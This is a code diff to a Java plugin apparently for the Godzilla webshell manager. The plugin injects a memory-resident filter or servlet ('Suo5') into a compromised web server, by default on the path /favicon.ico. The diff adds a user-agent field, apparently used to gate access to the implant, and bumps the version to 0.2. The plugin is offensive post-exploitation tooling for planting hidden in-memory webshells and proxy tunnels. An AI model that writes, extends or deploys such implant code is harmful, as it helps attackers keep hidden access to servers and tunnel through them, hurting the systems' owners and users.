@@ -7,23 +7,17 @@ import core.imp.Plugin;
 import core.shell.ShellEntity;
 import core.ui.component.RTextArea;
 import core.ui.component.dialog.GOptionPane;
-import java.awt.BorderLayout;
-import java.awt.event.ActionEvent;
-import java.awt.event.ComponentAdapter;
-import java.awt.event.ComponentEvent;
-import java.io.InputStream;
-import javax.swing.JButton;
-import javax.swing.JComboBox;
-import javax.swing.JLabel;
-import javax.swing.JPanel;
-import javax.swing.JScrollPane;
-import javax.swing.JSplitPane;
-import javax.swing.JTextField;
-
 import util.Log;
 import util.automaticBindClick;
 import util.functions;
 import util.http.ReqParameter;
+
+import javax.swing.*;
+import java.awt.*;
+import java.awt.event.ActionEvent;
+import java.awt.event.ComponentAdapter;
+import java.awt.event.ComponentEvent;
+import java.io.InputStream;
 
 @PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "Suo5MemShell", DisplayName = "Suo5MemShell")
 public class Suo5MemShell implements Plugin {
@@ -35,6 +29,8 @@ public class Suo5MemShell implements Plugin {
     private final JTextField urlPatternTextField = new JTextField("/favicon.ico", 15);
     private final JLabel filterNameLabel = new JLabel("filterName (when filter): ");
     private final JTextField filterNameTextField = new JTextField("", 15);
+    private final JLabel userAgentLabel = new JLabel("user-agent: ");
+    private final JTextField userAgentTextField = new JTextField("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3", 20);
     private final JComboBox<String> typeComboBox;
     private final JButton injectButton;
     private final JSplitPane splitPane;
@@ -48,7 +44,7 @@ public class Suo5MemShell implements Plugin {
         this.typeComboBox = new JComboBox(PROXY_TYPE);
         this.injectButton = new JButton("inject");
         this.resultTextArea = new RTextArea();
-        this.resultTextArea.append("Godzilla-Suo5MemShell version 0.1\n");
+        this.resultTextArea.append("Godzilla-Suo5MemShell version 0.2\n");
         this.splitPane = new JSplitPane();
         this.splitPane.setOrientation(0);
         this.splitPane.setDividerSize(0);
@@ -57,6 +53,8 @@ public class Suo5MemShell implements Plugin {
         topPanel.add(this.urlPatternTextField);
         topPanel.add(this.filterNameLabel);
         topPanel.add(this.filterNameTextField);
+        topPanel.add(this.userAgentLabel);
+        topPanel.add(this.userAgentTextField);
         topPanel.add(this.typeLabel);
         topPanel.add(this.typeComboBox);
         topPanel.add(this.injectButton);
@@ -77,6 +75,7 @@ public class Suo5MemShell implements Plugin {
             if (urlPattern.length() > 0) {
                 String proxyType = (String) this.typeComboBox.getSelectedItem();
                 String filterName = (String) this.filterNameTextField.getText();
+                String userAgent = (String) this.userAgentTextField.getText();
                 String className;
                 InputStream inputStream;
                 ReqParameter reqParameter = new ReqParameter();
@@ -91,6 +90,7 @@ public class Suo5MemShell implements Plugin {
                     inputStream = this.getClass().getResourceAsStream("/Suo5Servlet.class");
                     reqParameter.add("servletPath", urlPattern);
                 }
+                reqParameter.add("userAgent", userAgent);
 
                 byte[] classByteArray = functions.readInputStream(inputStream);
                 inputStream.close();
@@ -105,6 +105,7 @@ public class Suo5MemShell implements Plugin {
                     } else {
                         this.resultTextArea.append(String.format("injecting Suo5Servlet, servletPath: %s, result: %s\n", urlPattern, resultString));
                     }
+                    this.resultTextArea.append(String.format("user-agent: %s\n", userAgent));
                     GOptionPane.showMessageDialog(this.panel, "ok", "提示", 1);
                 } else {
                     GOptionPane.showMessageDialog(this.panel, "loader fail!", "提示", 2);
